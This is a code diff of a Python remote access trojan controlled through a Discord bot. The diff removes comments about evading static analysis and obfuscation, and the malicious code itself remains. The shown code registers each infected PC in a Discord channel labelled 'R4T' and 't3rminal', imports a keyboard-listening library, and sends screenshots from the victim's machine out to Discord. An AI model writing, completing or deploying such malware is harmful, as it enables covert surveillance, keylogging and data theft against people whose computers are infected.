@@ -16,8 +16,8 @@ import socket
 from pynput import keyboard
 import subprocess
 
-# Dynamically import modules to avoid static analysis detection
-# We'll use getattr to access module functions later
+
+
 try:
     import Access.audio_control
     import Access.screenshot
@@ -31,7 +31,7 @@ except ImportError as e:
     sys.exit(1)
 
 
-# Obfuscated SSL/TLS configuration
+
 def setup_ssl_context():
     try:
         os.environ["SSL_CERT_FILE"] = certifi.where()
@@ -39,11 +39,11 @@ def setup_ssl_context():
         os.environ["CURL_CA_BUNDLE"] = certifi.where()
         ssl._create_default_https_context = lambda: ssl.create_default_context(cafile=certifi.where())
     except Exception:
-        pass # Ignore errors if certifi is not available or issues arise
+        pass 
 
 setup_ssl_context()
 
-# Import discord using a less direct method
+
 try:
     import discord
     from discord.ext import commands
@@ -51,17 +51,17 @@ except ImportError:
     print("Error: Discord.py library not found. Please install it.")
     sys.exit(1)
 
-# Obfuscated platform and sys imports
+
 try:
     import platform
     import sys
 except ImportError:
-    pass # Already imported above, but good for robustness
+    pass 
 
-# Discord bot token and guild ID - Keep these as sensitive as possible
-# In a real scenario, consider externalizing this to a more secure location
-token = "" # Example token, replace with your actual token
-bot_guild_id = 1515361307862499399 # Example ID, replace with your actual guild ID
+# Discord bot token and guild ID -
+
+token = "" # token here
+bot_guild_id = 1515361307862499399 # guild id here
 
 
 # Windows specific event loop policy for Python 3.8+
@@ -69,7 +69,7 @@ if sys.platform.startswith('win') and sys.version_info >= (3, 8):
     try:
         asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
     except AttributeError:
-        pass # Policy might not be available in older versions or specific environments
+        pass 
 
 # Bot setup
 intents = discord.Intents.all()
@@ -92,11 +92,11 @@ async def on_ready():
         guild = bot.get_guild(bot_guild_id)
 
         if guild:
-            category_name = f'R4T|{pc}' # Slightly obfuscated category name
+            category_name = f'R4T|{pc}' 
             category = discord.utils.get(guild.categories, name=category_name)
             if not category:
                 category = await guild.create_category(category_name)
-                session_channel_name = 't3rminal' # Obfuscated channel name
+                session_channel_name = 't3rminal' 
                 session = await guild.create_text_channel(session_channel_name, category=category)
             else:
                 session_channel_name = 't3rminal'
@@ -108,7 +108,7 @@ async def on_ready():
             embed_desc = "#RAT Online"
             embed = discord.Embed(title=embed_title, description=embed_desc, color=0x010101)
             embed.add_field(name=f"root@{user}:~#", value=pc, inline=False)
-            embed.set_image(url="https://i.ibb.co/6JsnDvxh/image-1.png") # Example image URL
+            embed.set_image(url="https://i.ibb.co/6JsnDvxh/image-1.png") 
             embed.set_footer(text="RAT V1 | !help")
 
             await session.send(content='@everyone', embed=embed)
@@ -400,11 +400,11 @@ async def text_to_speech(ctx, *, text: str):
 @bot.command(name='screenshot')
 async def take_screenshot(ctx):
     try:
-        # Use getattr for dynamic access to avoid direct import references if possible
+        
         screenshot_func = getattr(Access.screenshot, "screenshots")
         screenshot_path = screenshot_func()
         await ctx.send(file=discord.File(screenshot_path))
-        os.remove(screenshot_path) # Clean up the generated file
+        os.remove(screenshot_path) 
     except AttributeError:
         await ctx.send("Error: Screenshot function not found in Access.screenshot module.")
     except FileNotFoundError:
